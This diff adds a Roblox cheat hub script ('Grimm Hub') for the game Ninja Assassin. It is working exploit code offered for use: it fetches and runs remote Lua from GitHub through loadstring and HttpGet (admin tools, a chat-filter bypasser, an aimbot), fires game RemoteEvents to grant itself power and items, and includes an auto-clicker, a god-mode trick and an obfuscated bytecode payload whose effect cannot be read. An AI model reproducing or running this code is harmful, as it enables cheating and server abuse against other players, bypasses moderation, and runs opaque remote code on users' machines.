@@ -1,1 +1,719 @@
-print("hello")
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Grimm Hub Made by Dark-Turns#2318 VERSION: 1.2", "Midnight")
+
+ local function callback(Text)
+ if Text == "Button1 text" then
+  print ("Answer")
+elseif Text == ("Button2 text") then
+ print ("Answer2")
+ end
+end
+
+local NotificationBindable = Instance.new("BindableFunction")
+NotificationBindable.OnInvoke = callback
+
+game.StarterGui:SetCore("SendNotification",  {
+ Title = "Script Was Last Updated at 8/12/2023";
+ Text = "DM me if you think you are in the wrong version";
+ Icon = "";
+ Duration = 1000;
+ Button1 = "Ok!";
+ Button2 = "I Will DM You!";
+ Callback = NotificationBindable;
+})
+
+local Main = Window:NewTab("Misc Scripts")
+local MainSection = Main:NewSection("Misc Scripts")
+
+MainSection:NewButton("Chat Bypasser", "Bypasses the chat with 2 Methods: 1, 3,", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/synnyyy/synergy/additional/betterbypasser", true))({
+    Method = 1, -- Method 1 is the main method. Method two is emojis. Method 3 is full transparency, no special symbols. Method 3 has been improved!
+    Keybind = "F", -- Usually defaulted to F. You can change this keybind by replacing the string with a letter. Works for uppercase and lowercase.
+    ShowMethodDictionary = true -- Shows you the full list of words that you can say with the method. Press FN + F9 to see this dictionary.
+})
+end)
+
+local MainSection = Main:NewSection("Sliders")
+
+MainSection:NewSlider("Speed", "Upgrades the amount of Speed you have.", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
+end)
+
+local MainSection = Main:NewSection("Other Guis")
+
+MainSection:NewButton("Kater Hub", "Kater Hub (WILL DESTROY CURRENT GUI)", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KATERGaming/Roblox/main/KaterHub.Lua"))()
+end)
+
+MainSection:NewButton("Watty Hub", "Watty Hub", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Wattville/Watty-Hub-Public/main/watty-hub'))()
+-- To Load
+end)
+
+MainSection:NewButton("Premium Exultion Project", "Premium", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ExolutionProject/Scripts/main/ExolutionPremiumHub.lua", false))()
+end)
+
+MainSection:NewKeybind("Toggle Gui", "Press Here to Toggle Gui", Enum.KeyCode.F, function()
+	Library:ToggleUI()
+end)
+
+local Main = Window:NewTab("Admin Scripts")
+local MainSection = Main:NewSection("Admin Scripts")
+
+MainSection:NewButton("Infinite Yeild", "Might Be The Best Admin Script", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+
+MainSection:NewButton("CMD-X", "Might Be The Second To best Admin Script", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
+end)
+
+MainSection:NewButton("Nameless Admin", "Might Be The Third to Best Admin Script", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))();
+end)
+
+--NA
+local Main = Window:NewTab("Ninja Assassin")
+local MainSection = Main:NewSection("Ninja Assassin")
+
+MainSection:NewButton("Auto Train", "Auto Trains for you.", function()
+    while true do
+wait(0.1)
+for i=1, 10 do
+v = math.random (7, 10)
+game.ReplicatedStorage.RemoteEvent.AddPowerEvent:FireServer("FromTraining", v)
+end
+end
+end)
+
+MainSection:NewButton("Auto Train 2x", "You Must Have the 2x Ninjitsu Glitch On.", function()
+    local vu = game:GetService("VirtualUser")
+local train = game.ReplicatedStorage:WaitForChild("RemoteEvent"):WaitForChild("AddPowerEvent")
+
+game.Players.LocalPlayer.Idled:Connect(function()
+    vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+    wait(1)
+    vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+end)
+while true do
+game.ReplicatedStorage.RemoteEvent.AddPowerEvent:FireServer("FromTraining",20)
+wait(0.7)
+game.ReplicatedStorage.RemoteEvent.AddPowerEvent:FireServer("FromTraining",19.99)
+wait(0.7)
+end
+end)
+
+MainSection:NewButton("Negitive Nin", "Negitive Nin", function()
+    local rs = game:GetService("ReplicatedStorage")
+    while wait(0.72) do
+        rs.RemoteEvent.AddPowerEvent:FireServer("FromTraining", -2000000000000000000000000000000000000000000000000)
+        wait(0.72)
+        rs.RemoteEvent.AddPowerEvent:FireServer("FromTraining", -19916241294912496129491248999999.99) 
+    end
+end)
+
+MainSection:NewButton("Leader Stats Improver", "Gives you a better visual on how much stats you have.", function()
+    while not game:IsLoaded() or not game:GetService("CoreGui") or not game:GetService("Players").LocalPlayer or not game:GetService("Players").LocalPlayer.PlayerGui or not game:GetService("CoreGui"):FindFirstChild("TopBarApp") or not game:GetService("CoreGui"):FindFirstChild("PlayerList") or not game.Players.LocalPlayer.Character do wait() end
+local on = true
+if not on then return end
+local PlaceValues = {
+    [823323202] = 1;
+}
+
+if not PlaceValues[game.PlaceId] then return end
+
+repeat task.wait(0.1) until game.Players.LocalPlayer:FindFirstChild("leaderstats")
+
+local numofstats = 0
+for i,v in ipairs(game.Players.LocalPlayer:FindFirstChild("leaderstats"):GetChildren()) do
+    numofstats = numofstats + 1
+end
+local numnum = numofstats * 110
+local xvalue = numnum + 172
+local divxvalue = xvalue - 110
+local coregui = game:GetService("CoreGui")
+local playerlist = coregui:WaitForChild("PlayerList")
+local Teams = game:GetService("Teams")
+local Players = game:GetService("Players")
+local plrsandteams = playerlist:WaitForChild("PlayerListMaster").OffsetFrame.PlayerScrollList.SizeOffsetFrame.ScrollingFrameContainer.ScrollingFrameClippingFrame.ScollingFrame.OffsetUndoFrame
+local titlebar = playerlist.PlayerListMaster.OffsetFrame.PlayerScrollList.SizeOffsetFrame:WaitForChild("TitleBar")
+local suffixes = {'','K+','M+','B+','T+','qd+','Qn+','sx+','Sp+','O+','N+','de+','Ud+','DD+','tdD+','qdD+','QnD+','sxD+','SpD+','OcD+','NvD+','Vgn+','UVg+','DVg+','TVg+','qtV+','QnV+','SeV+','SPG+','OVG+','NVG+','TGN+','UTG+','DTG+','tsTG+','qtTG+','QnTG+','ssTG+','SpTG+','OcTG+','NoAG+','UnAG+','DuAG+','TeAG+','QdAG+','QnAG+','SxAG+','SpAG+','OcAG+','NvAG+','CT+'}
+local TeamValues = {}
+local PlayerValues = {}
+local Exceptions = {
+    ['Reputation'] = 1;
+    ['Power'] = 1;
+}
+local LBExceptions = {
+    ['Realm'] = 150;
+}
+
+local function comma_value(n)
+    if tonumber(n) then
+        local left,num,right = string.match(n,'^([^%d]*%d)(%d*)(.-)$')
+        return left..(num:reverse():gsub('(%d%d%d)','%1,'):reverse())..right
+    else
+        return n
+    end
+end
+local function format(val)
+    if tonumber(val) then
+        local negative = false
+        if string.sub(val,1,1) == "-" then
+            val = string.sub(val,2,string.len(val))
+            negative = true
+        end
+        for i=1, #suffixes do
+            if tonumber(val) < 10^(i*3) then
+                local value = math.floor(val/((10^((i-1)*3))/100))/(100)..suffixes[i]
+                if negative then value = "-"..value end
+                return value
+            end
+        end
+    else
+        return val
+    end
+end
+local function GetPlayer(text)
+    for _,Player in pairs(game.Players:GetPlayers()) do
+        if string.sub(string.lower(Player.Name),1,string.len(text)) == string.lower(text) then
+            return Player
+        elseif string.sub(string.lower(Player.DisplayName),1,string.len(text)) == string.lower(text) then
+            return Player
+        elseif Player.UserId == tonumber(text) then
+            return Player
+        end
+    end
+end
+local function UpdateTeamValues()
+    for i,v in pairs(TeamValues) do
+        TeamValues[i] = 0
+    end
+    local plr
+    for i,v in pairs(Players:GetPlayers()) do
+        if v:FindFirstChild("leaderstats") then
+            plr = v
+            for i,v in pairs(v:FindFirstChild("leaderstats"):GetChildren()) do
+                if tonumber(v.Value) then
+                    TeamValues[plr.Team.Name.."_"..v.Name] = TeamValues[plr.Team.Name.."_"..v.Name] + v.Value
+                end
+            end
+        end
+    end
+    for i,v in pairs(plrsandteams:GetChildren()) do
+        if string.sub(v.Name,1,1) == "t" then
+            for i,v in pairs(v:GetChildren()) do
+                if string.lower(string.sub(v.Name,1,8)) == "gamestat" then
+                    local statname = string.sub(v.Name,10,string.len(v.Name))
+                    if Exceptions[statname] then
+                        if tonumber(TeamValues[v.Parent.NameFrame.BGFrame.OverlayFrame.TeamName.Text.."_"..statname]) then
+                            v.OverlayFrame.StatText.Text = format(TeamValues[v.Parent.NameFrame.BGFrame.OverlayFrame.TeamName.Text.."_"..statname])
+                        else
+                            v.OverlayFrame.StatText.Text = "-"
+                        end
+                    else
+                        if tonumber(TeamValues[v.Parent.NameFrame.BGFrame.OverlayFrame.TeamName.Text.."_"..statname]) then
+                            v.OverlayFrame.StatText.Text = comma_value(TeamValues[v.Parent.NameFrame.BGFrame.OverlayFrame.TeamName.Text.."_"..statname])
+                        else
+                            v.OverlayFrame.StatText.Text = "-"
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+local function UpdatePlayerStats(plr)
+    repeat task.wait(0.1) until plr:FindFirstChild("leaderstats")
+    for i,v in pairs(plr:FindFirstChild("leaderstats"):GetChildren()) do
+        if not PlayerValues[plr.Name.."_"..v.Name] then
+            PlayerValues[plr.Name.."_"..v.Name] = 0
+        end
+        PlayerValues[plr.Name.."_"..v.Name] = v.Value
+    end
+    for i,v in pairs(plrsandteams:GetChildren()) do
+        if string.sub(v.Name,1,1) == "p" then
+            if GetPlayer(string.sub(v.Name,3,string.len(v.Name))) == plr then
+                for i,v in pairs(v.ChildrenFrame:GetChildren()) do
+                    if string.lower(string.sub(v.Name,1,8)) == "gamestat" then
+                        local statname = string.sub(v.Name,10,string.len(v.Name))
+                        if Exceptions[statname] then
+                            v.OverlayFrame.StatText.Text = format(PlayerValues[plr.Name.."_"..statname])
+                        else
+                            v.OverlayFrame.StatText.Text = comma_value(PlayerValues[plr.Name.."_"..statname])
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+local function UpdatePlayerListSize()
+    for i,v in pairs(plrsandteams:GetChildren()) do
+        if string.sub(v.Name,1,1) == "t" then
+            for i,v in pairs(v:GetChildren()) do
+                if v.Name == "BackgroundExtender" then
+                    if v.Size ~= UDim2.new(1,0,1,0) then
+                        v.Size = UDim2.new(1,0,1,0)
+                    end
+                end
+                if string.lower(string.sub(v.Name,1,8)) == "gamestat" then
+                    local statname = string.sub(v.Name,10,string.len(v.Name))
+                    if v.Size ~= UDim2.new(1,-divxvalue,1,0) then
+                        v.Size = UDim2.new(1,-divxvalue,1,0)
+                    end
+                end
+            end
+        elseif string.sub(v.Name,1,1) == "p" then
+            for i,v in pairs(v.ChildrenFrame:GetChildren()) do
+                if v.Name == "BackgroundExtender" then
+                    if v.Size ~= UDim2.new(1,0,1,0) then
+                        v.Size = UDim2.new(1,0,1,0)
+                    end
+                end
+                if string.lower(string.sub(v.Name,1,8)) == "gamestat" then
+                    local statname = string.sub(v.Name,10,string.len(v.Name))
+                    if v.Size ~= UDim2.new(1,-divxvalue,1,0) then
+                        v.Size = UDim2.new(1,-divxvalue,1,0)
+                    end
+                end
+            end
+        end
+    end
+    for i,v in pairs(titlebar.ChildrenFrame:GetChildren()) do
+        if string.lower(string.sub(v.Name,1,4)) == "stat" then
+            local statname = string.sub(v.Name,10,string.len(v.Name))
+            if v.Size ~= UDim2.new(1,-divxvalue,1,0) then
+                v.Size = UDim2.new(1,-divxvalue,1,0)
+            end
+        end
+    end
+end
+
+for i,v in pairs(game.Teams:GetChildren()) do
+    local teamname = v.Name
+    for i,v in pairs(Players.LocalPlayer:FindFirstChild("leaderstats"):GetChildren()) do
+        TeamValues[teamname.."_"..v.Name] = 0
+    end
+end
+
+for i,v in pairs(Players:GetPlayers()) do
+    task.spawn(function()
+        repeat task.wait() until v:FindFirstChild("leaderstats")
+        if v:FindFirstChild("leaderstats") then
+            local plr = v
+            for i,v in pairs(v:FindFirstChild("leaderstats"):GetChildren()) do
+                v:GetPropertyChangedSignal("Value"):Connect(function()
+                    UpdateTeamValues()
+                    UpdatePlayerStats(plr)
+                end)
+            end
+            UpdatePlayerStats(plr)
+        end
+        UpdatePlayerListSize()
+    end)
+end
+
+Players.PlayerAdded:Connect(function(plr)
+    repeat task.wait() until plr:FindFirstChild("leaderstats")
+    repeat
+        task.wait()
+        local plrnumofstats = 0
+        for i,v in ipairs(plr:FindFirstChild("leaderstats"):GetChildren()) do
+            plrnumofstats = plrnumofstats + 1
+        end
+    until plrnumofstats == numofstats
+    for i,v in pairs(plr:FindFirstChild("leaderstats"):GetChildren()) do
+        v:GetPropertyChangedSignal("Value"):Connect(function()
+            UpdateTeamValues()
+            UpdatePlayerStats(plr)
+        end)
+    end
+    task.wait(0.5)
+    UpdatePlayerStats(plr)
+    UpdatePlayerListSize()
+end)
+Players.PlayerRemoving:Connect(function(plr)
+    UpdateTeamValues()
+end)
+
+playerlist.PlayerListMaster.Size = UDim2.new(0,xvalue,0,680)
+UpdatePlayerListSize()
+
+task.spawn(function()
+    while task.wait(1) do
+        for i,plr in pairs(Players:GetPlayers()) do
+            UpdatePlayerStats(plr)
+        end
+        UpdateTeamValues()
+        UpdatePlayerListSize()
+    end
+end)
+end)
+
+MainSection:NewButton("Auto Clicker", "Press V To Enable.", function()
+    local time = 0.01 --decrease if too slow increase if too fast
+
+click = false
+m = game.Players.LocalPlayer:GetMouse()
+m.KeyDown:connect(function(key)
+if key == "v" then
+if click == true then click = false
+elseif
+click == false then click = true
+
+while click == true do 
+wait(time)
+mouse1click()
+end
+end
+end
+end)
+end)
+
+MainSection:NewButton("Auto Re Equip Training Sword", "Auto Re equips sword.", function()
+    _G.AutoEquip = true
+local Players = game:GetService("Players")
+
+task.spawn(function()
+    while _G.AutoEquip do
+        if Players.LocalPlayer.Character and charrespawning == false then
+            if not Players.LocalPlayer.Character:FindFirstChild("Train") then
+                if Players.LocalPlayer.Backpack:FindFirstChild("Train") then
+                    Players.LocalPlayer.Backpack:FindFirstChild("Train").Parent = Players.LocalPlayer.Character
+                end
+            end
+        end
+        task.wait()
+    end
+end)
+end)
+
+MainSection:NewButton("FF Giver", "Gives you a force field.", function()
+    local beforepos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+local ff = game.Players.LocalPlayer.Character:FindFirstChild("ForceField")
+
+if not ff then
+    repeat
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(70,98,-335)
+        wait(0.1)
+    until game.Players.LocalPlayer.Character:FindFirstChild("ForceField")
+else
+    return
+end
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = beforepos
+end)
+
+MainSection:NewButton("Give Rainbow Shuriken", "Best Shuriken 👍", function()
+    game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):WaitForChild("GiveItemEvent"):FireServer("RainbowPass","MetallicThrowingKnives")
+end)
+
+MainSection:NewButton("Other NA Gui", "Seperate Gui With more features", function()
+    
+wait()
+local StarterGui = game:GetService("StarterGui")
+StarterGui:SetCore("SendNotification", {
+	Title = '8------D',
+	Text = 'Yes i just said fuck off',
+	Duration = 14.0,
+}
+)
+local ScreenGui = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local label = Instance.new("TextLabel")
+local fasttools = Instance.new("TextButton")
+local aimbot = Instance.new("TextButton")
+local autotrainx1 = Instance.new("TextButton")
+local autotrainx2 = Instance.new("TextButton")
+local autotrainx4 = Instance.new("TextButton")
+local shurikenswitch = Instance.new("TextButton")
+local yinshuriken = Instance.new("TextButton")
+local rejoin = Instance.new("TextButton")
+local god = Instance.new("TextButton")
+ScreenGui.Parent = game.CoreGui
+
+main.Name = "main"
+main.Parent = ScreenGui
+main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+main.BorderColor3 = Color3.fromRGB(12, 12, 12)
+main.Position = UDim2.new(0.61636728, 0, 0.645443261, 0)
+main.Size = UDim2.new(0, 450, 0, 250)
+main.Active = true
+main.Draggable = true
+
+label.Name = "label"
+label.Parent = main
+label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+label.Size = UDim2.new(0, 450, 0, 35)
+label.Font = Enum.Font.SciFi
+label.Text = "NA GUI| Made by Anouymous"
+label.TextColor3 = Color3.fromRGB(255, 0, 0)
+label.TextSize = 14.000
+
+fasttools.Name = "Fast Tools" --Dont Press Twice
+fasttools.Parent = main
+fasttools.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+fasttools.Position = UDim2.new(0.004230242, 0, 0.166348306, 0)
+fasttools.Size = UDim2.new(0, 95, 0, 40)
+fasttools.Font = Enum.Font.SourceSans
+fasttools.Text = "Fast Tools"
+fasttools.TextColor3 = Color3.fromRGB(255, 0, 0)
+fasttools.TextSize = 14.000
+fasttools.MouseButton1Down:connect(function()
+local d=string.byte;local r=string.char;local c=string.sub;local u=table.concat;local h=math.ldexp;local W=getfenv or function()return _ENV end;local l=setmetatable;local s=select;local a=unpack;local f=tonumber;local function b(d)local e,n,t="","",{}local a=256;local o={}for l=0,a-1 do o[l]=r(l)end;local l=1;local function i()local e=f(c(d,l,l),36)l=l+1;local n=f(c(d,l,l+e-1),36)l=l+e;return n end;e=r(i())t[1]=e;while l<#d do local l=i()if o[l]then n=o[l]else n=e..c(e,1,1)end;o[a]=e..c(n,1,1)t[#t+1],e,a=n,n,a+1 end;return table.concat(t)end;local f=b('21X21W27527621W27427521Y27921W21121X22727621V22422C21W24T22421W25G21U27625127527P22C25025725127K25G21X22427W24M27N27528524L28527724X27628128328522027624P27727K21W24Z28K28A27621S28524R28521Z27627B27621121Y28G27521821721721B1Y21D21621321C21921721621Y21S27621F21121921C21W27Q27521T27V25724M28K21X22K28322K27522121W27W24U28P22K22S21W24N29W21W21T28225724I28528Q27528S275');local o=bit and bit.bxor or function(l,e)local n,o=1,0 while l>0 and e>0 do local a,c=l%2,e%2 if a~=c then o=o+n end l,e,n=(l-a)/2,(e-c)/2,n*2 end if l<e then l=e end while l>0 do local e=l%2 if e>0 then o=o+n end l,n=(l-e)/2,n*2 end return o end local function l(e,l,n)if n then local l=(e/2^(l-1))%2^((n-1)-(l-1)+1);return l-l%1;else local l=2^(l-1);return(e%(l+l)>=l)and 1 or 0;end;end;local e=1;local function n()local n,c,a,l=d(f,e,e+3);n=o(n,68)c=o(c,68)a=o(a,68)l=o(l,68)e=e+4;return(l*16777216)+(a*65536)+(c*256)+n;end;local function t()local l=o(d(f,e,e),68);e=e+1;return l;end;local function i()local e=n();local o=n();local c=1;local n=(l(o,1,20)*(2^32))+e;local e=l(o,21,31);local l=((-1)^l(o,32));if(e==0)then if(n==0)then return l*0;else e=1;c=0;end;elseif(e==2047)then return(n==0)and(l*(1/0))or(l*(0/0));end;return h(l,e-1023)*(c+(n/(2^52)));end;local h=n;local function b(l)local n;if(not l)then l=h();if(l==0)then return'';end;end;n=c(f,e,e+l-1);e=e+l;local e={}for l=1,#n do e[l]=r(o(d(c(n,l,l)),68))end return u(e);end;local e=n;local function f(...)return{...},s('#',...)end local function u()local d={0,0,0,0,0,0,0,0,0,0,0};local e={0};local c={};local a={d,nil,e,nil,c};for l=1,n()do e[l-1]=u();end;local e=n()local c={0,0,0};for n=1,e do local e=t();local l;if(e==0)then l=(t()~=0);elseif(e==3)then l=i();elseif(e==2)then l=b();end;c[n]=l;end;a[2]=c a[4]=t();for a=1,n()do local c=o(n(),4);local n=o(n(),229);local o=l(c,1,2);local e=l(n,1,11);local e={e,l(c,3,11),nil,nil,n};if(o==0)then e[3]=l(c,12,20);e[5]=l(c,21,29);elseif(o==1)then e[3]=l(n,12,33);elseif(o==2)then e[3]=l(n,12,32)-1048575;elseif(o==3)then e[3]=l(n,12,32)-1048575;e[5]=l(c,21,29);end;d[a]=e;end;return a;end;local function r(l,e,c)local o=l[1];local n=l[2];local e=l[3];local l=l[4];return function(...)local u=o;local t=n;local h=e;local n=l;local l=f local o=1;local d=-1;local W={};local i={...};local f=s('#',...)-1;local l={};local e={};for l=0,f do if(l>=n)then W[l-n]=i[l+1];else e[l]=i[l+1];end;end;local l=f-n+1 local l;local n;while true do l=u[o];n=l[1];if n<=10 then if n<=4 then if n<=1 then if n==0 then o=o+l[3];else local o=l[2];local t={};local n=0;local c=o+l[3]-1;for l=o+1,c do n=n+1;t[n]=e[l];end;local c={e[o](a(t,1,c-o))};local l=o+l[5]-2;n=0;for l=o,l do n=n+1;e[l]=c[n];end;d=l;end;elseif n<=2 then do return end;elseif n>3 then local l=l[2];do return e[l]();end;else c[t[l[3]]]=e[l[2]];end;elseif n<=7 then if n<=5 then if not e[l[2]]then o=o+1;else o=o+l[3];end;elseif n>6 then e[l[2]]=c[t[l[3]]];else local o=l[2];local c={};local n=0;local t=o+l[3]-1;for l=o+1,t do n=n+1;c[n]=e[l];end;local c={e[o](a(c,1,t-o))};local l=o+l[5]-2;n=0;for l=o,l do n=n+1;e[l]=c[n];end;d=l;end;elseif n<=8 then e[l[2]]=e[l[3]];elseif n==9 then e[l[2]]=r(h[l[3]],nil,c);else do return end;end;elseif n<=15 then if n<=12 then if n==11 then local c=l[2];local o=d;local n={};local l=0;for o=c,o do l=l+1;n[l]=e[o];end;do return a(n,1,l)end;else if not e[l[2]]then o=o+1;else o=o+l[3];end;end;elseif n<=13 then e[l[2]]=c[t[l[3]]];elseif n>14 then e[l[2]]=r(h[l[3]],nil,c);else local n=l[2];local o={};local l=n+l[3]-1;for l=n+1,l do o[#o+1]=e[l];end;do return e[n](a(o,1,l-n))end;end;elseif n<=18 then if n<=16 then local o=l[2];local c=d;local n={};local l=0;for o=o,c do l=l+1;n[l]=e[o];end;do return a(n,1,l)end;elseif n==17 then local l=l[2];do return e[l]();end;else local n=l[2];local o={};local l=n+l[3]-1;for l=n+1,l do o[#o+1]=e[l];end;do return e[n](a(o,1,l-n))end;end;elseif n<=19 then c[t[l[3]]]=e[l[2]];elseif n>20 then e[l[2]]=e[l[3]];else o=o+l[3];end;o=o+1;end;end;end;return r(u(),{},W())();
+end)
+
+
+autotrainx1.Name = "auto train x1"
+autotrainx1.Parent = main
+autotrainx1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+autotrainx1.Position = UDim2.new(0.361816704, 0, 0.166348381, 0)
+autotrainx1.Size = UDim2.new(0, 95, 0, 40)
+autotrainx1.Font = Enum.Font.SourceSans
+autotrainx1.Text = "auto train x1"
+autotrainx1.TextColor3 = Color3.fromRGB(255, 0, 0)
+autotrainx1.TextSize = 14.000
+autotrainx1.MouseButton1Down:connect(function()
+	local rs = game:GetService("ReplicatedStorage")
+	while wait(0.7) do
+		rs.RemoteEvent.AddPowerEvent:FireServer("FromTraining", 10)
+		wait(0.7)
+		rs.RemoteEvent.AddPowerEvent:FireServer("FromTraining", 9.99) 
+	end
+end)
+
+autotrainx2.Name = "auto train x2"
+autotrainx2.Parent = main
+autotrainx2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+autotrainx2.Position = UDim2.new(0.361816704, 0, 0.349622924, 0)
+autotrainx2.Size = UDim2.new(0, 95, 0, 40)
+autotrainx2.Font = Enum.Font.SourceSans
+autotrainx2.Text = "auto train x2"
+autotrainx2.TextColor3 = Color3.fromRGB(255, 0, 0)
+autotrainx2.TextSize = 14.000
+autotrainx2.MouseButton1Down:connect(function()
+	local rs = game:GetService("ReplicatedStorage")
+	while wait(0.7) do
+		rs.RemoteEvent.AddPowerEvent:FireServer("FromTraining", 20)
+		wait(0.7)
+		rs.RemoteEvent.AddPowerEvent:FireServer("FromTraining", 19.99) 
+	end
+end)
+
+autotrainx4.Name = "auto train x4"
+autotrainx4.Parent = main
+autotrainx4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+autotrainx4.Position = UDim2.new(0.361816704, 0, 0.519192932, 0)
+autotrainx4.Size = UDim2.new(0, 95, 0, 40)
+autotrainx4.Font = Enum.Font.SourceSans
+autotrainx4.Text = "auto train x4"
+autotrainx4.TextColor3 = Color3.fromRGB(255, 0, 0)
+autotrainx4.TextSize = 14.000
+autotrainx4.MouseButton1Down:connect(function()
+	local rs = game:GetService("ReplicatedStorage")
+	while wait(0.7) do
+		rs.RemoteEvent.AddPowerEvent:FireServer("FromTraining", 40)
+		wait(0.7)
+		rs.RemoteEvent.AddPowerEvent:FireServer("FromTraining", 39.99) 
+	end
+end)
+
+shurikenswitch.Name = "Shuriken Switch"
+shurikenswitch.Parent = main
+shurikenswitch.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+shurikenswitch.Position = UDim2.new(0.004230242, 0, 0.350020366, 0)
+shurikenswitch.Size = UDim2.new(0, 95, 0, 40)
+shurikenswitch.Font = Enum.Font.SourceSans
+shurikenswitch.Text = "Shuriken Switch"
+shurikenswitch.TextColor3 = Color3.fromRGB(255, 0, 0)
+shurikenswitch.TextSize = 14.000
+shurikenswitch.MouseButton1Down:connect(function()
+while true do
+local args = {
+        [1] = "Shuriken",
+        [2] = "Shuriken9Yang"
+    }
+    game:GetService("ReplicatedStorage").RemoteEvent.GiveItemEvent:FireServer(unpack(args))
+wait()
+local args = {
+        [1] = "Shuriken",
+        [2] = "Shuriken9Ying"
+    }
+    game:GetService("ReplicatedStorage").RemoteEvent.GiveItemEvent:FireServer(unpack(args))
+    wait()
+local args = {
+        [1] = "Shuriken",
+        [2] = "Shuriken8Ying"
+    }
+    game:GetService("ReplicatedStorage").RemoteEvent.GiveItemEvent:FireServer(unpack(args))
+    wait()
+local args = {
+        [1] = "Shuriken",
+        [2] = "Shuriken8Yang"
+    }
+    game:GetService("ReplicatedStorage").RemoteEvent.GiveItemEvent:FireServer(unpack(args))
+    wait()
+local args = {
+        [1] = "Shuriken",
+        [2] = "Shuriken7"
+    }
+    game:GetService("ReplicatedStorage").RemoteEvent.GiveItemEvent:FireServer(unpack(args))
+    wait()
+local args = {
+        [1] = "Shuriken",
+        [2] = "Shuriken6"
+    }
+    game:GetService("ReplicatedStorage").RemoteEvent.GiveItemEvent:FireServer(unpack(args))
+    wait()
+local args = {
+        [1] = "Shuriken",
+        [2] = "Shuriken5"
+    }
+    game:GetService("ReplicatedStorage").RemoteEvent.GiveItemEvent:FireServer(unpack(args))
+    wait()
+local args = {
+        [1] = "Shuriken",
+        [2] = "Shuriken4"
+    }
+    game:GetService("ReplicatedStorage").RemoteEvent.GiveItemEvent:FireServer(unpack(args))
+    wait()
+local args = {
+        [1] = "Shuriken",
+        [2] = "Shuriken3"
+    }
+    game:GetService("ReplicatedStorage").RemoteEvent.GiveItemEvent:FireServer(unpack(args))
+    wait()
+local args = {
+        [1] = "Shuriken",
+        [2] = "Shuriken2"
+    }
+    game:GetService("ReplicatedStorage").RemoteEvent.GiveItemEvent:FireServer(unpack(args))
+    wait()
+local args = {
+        [1] = "Shuriken",
+        [2] = "Shuriken1"
+    }
+    game:GetService("ReplicatedStorage").RemoteEvent.GiveItemEvent:FireServer(unpack(args))
+    wait()end
+end)
+
+aimbot.Name = "Custom Aimbot"
+aimbot.Parent = main
+aimbot.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+aimbot.Position = UDim2.new(0.004230242, 0, 0.530020366, 0)
+aimbot.Size = UDim2.new(0, 95, 0, 40)
+aimbot.Font = Enum.Font.SourceSans
+aimbot.Text = "Custom Aimbot"
+aimbot.TextColor3 = Color3.fromRGB(255, 0, 0)
+aimbot.TextSize = 14.000
+aimbot.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Blissful4992/Miscellaneous/main/UNIVERSAL.lua"))()
+end)
+
+yinshuriken.Name = "Shuriken Yin"
+yinshuriken.Parent = main
+yinshuriken.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+yinshuriken.Position = UDim2.new(0.003230242, 0, 0.700020366, 0)
+yinshuriken.Size = UDim2.new(0, 95, 0, 40)
+yinshuriken.Font = Enum.Font.SourceSans
+yinshuriken.Text = "Shuriken Yin"
+yinshuriken.TextColor3 = Color3.fromRGB(255, 0, 0)
+yinshuriken.TextSize = 14.000
+yinshuriken.MouseButton1Down:connect(function()
+local args = {
+        [1] = "Shuriken",
+        [2] = "Shuriken9Ying"
+    }
+    game:GetService("ReplicatedStorage").RemoteEvent.GiveItemEvent:FireServer(unpack(args))
+end)
+
+rejoin.Name = "Rejoin"
+rejoin.Parent = main
+rejoin.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+rejoin.Position = UDim2.new(0.360230242, 0, 0.700020366, 0)
+rejoin.Size = UDim2.new(0, 95, 0, 40)
+rejoin.Font = Enum.Font.SourceSans
+rejoin.Text = "Rejoin"
+rejoin.TextColor3 = Color3.fromRGB(255, 0, 0)
+rejoin.TextSize = 14.000
+rejoin.MouseButton1Down:connect(function()
+game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
+end)
+
+god.Name = "God Mode"
+god.Parent = main
+god.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+god.Position = UDim2.new(0.650230242, 0, 0.170020366, 0)
+god.Size = UDim2.new(0, 95, 0, 40)
+god.Font = Enum.Font.SourceSans
+god.Text = "God Mode"
+god.TextColor3 = Color3.fromRGB(255, 0, 0)
+god.TextSize = 14.000
+god.MouseButton1Down:connect(function()
+game.Players.LocalPlayer.Character.Humanoid.Name = 1
+            local l = game.Players.LocalPlayer.Character["1"]:Clone()
+            l.Parent = game.Players.LocalPlayer.Character
+            l.Name = "Humanoid"
+            wait(0.1)
+            game.Players.LocalPlayer.Character["1"]:Destroy()
+            game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
+            game.Players.LocalPlayer.Character.Animate.Disabled = true
+            wait(0.1)
+            game.Players.LocalPlayer.Character.Animate.Disabled = false
